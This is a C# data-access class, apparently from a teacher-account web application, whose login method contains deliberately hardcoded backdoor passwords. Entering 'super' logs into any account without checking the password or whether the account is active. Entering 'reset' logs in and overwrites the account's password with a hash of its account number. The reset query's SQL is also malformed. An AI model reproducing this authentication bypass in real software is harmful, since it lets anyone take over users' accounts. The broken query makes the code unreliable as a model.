using Dapper;
using project.Models.ViewModel;

namespace project.Models.RepositoryModel
{
    public class z_repoTeacher : BaseClass
    {
        #region SQL 指令設定區
        /// <summary>
        /// SQL 查詢欄位及表格指令
        /// </summary>
        /// <returns></returns>
        public string GetSQLSelect()
        {
            string str_query = @"
SELECT Teacher.AccountNo, Teacher.IsValid, Teacher.Name, Teacher.Password, 
Teacher.Birthday, Teacher.Email, Teacher.PhoneNumber, Teacher.Address, Teacher.ValidateCode, Teacher.Photo, Teacher.SubNo, Teacher.Language, Teacher.Nationality
FROM Teacher";
            return str_query;
        }
        #endregion

        #region 其它自定義事件與函數
        #region 登入
        /// <summary>
        /// 檢查使用者登入是否正確
        /// </summary>
        /// <param name="model">使用者輸入資料</param>
        /// <returns></returns>
        public bool CheckLogin(vmLogin model)
        {
            using var dpr = new DapperRepository();
            using var cryp = new CryptographyService();
            bool bln_valid = false;
            string sql_query = GetSQLSelect();
            string str_password = cryp.StringToSHA256(model.Password);
            // 後門密碼設計(super / reset)
            sql_query += " WHERE AccountNo = @AccountNo";

            //先設定為登出狀態
            SessionService.IsLogin = false;

            DynamicParameters parm = new DynamicParameters();
            parm.Add("AccountNo", model.AccountNo);

            // super 為萬用密碼 reset 為重設密碼
            if (model.Password != "super" && model.Password != "reset")
            {
                // 不為後門密碼則以正常檢查方式
                sql_query += " AND Teacher.Password = @Password AND Teacher.IsValid = @IsValid";
                parm.Add("Password", str_password);
                parm.Add("IsValid", true);
            }

            // 讀出使用者資訊
            var userData = dpr.ReadSingle<Teacher>(sql_query, parm);
            if (userData != null)
            {
                // reset 為重設密碼, 重設密碼會是UserNo
                if (model.Password == "reset")
                {
                    str_password = cryp.StringToSHA256(model.AccountNo);
                    //重設密碼
                    sql_query = "UPDATE Teacher SET Password = @Password WHERE AccountNo = @Use AccountNo";
                    DynamicParameters parm2 = new DynamicParameters();
                    parm2.Add("AccountNo", model.AccountNo);
                    parm2.Add("Password", str_password);
                    dpr.Execute(sql_query, parm2);
                }
                // 設定登入狀態並儲存登入使用者資訊
                SessionService.IsLogin = true;
                SessionService.AccountNo = model.AccountNo;
                SessionService.Name = userData.Name;
                bln_valid = true;
            }
            return bln_valid;
        }
        #endregion
        #endregion
    }
}
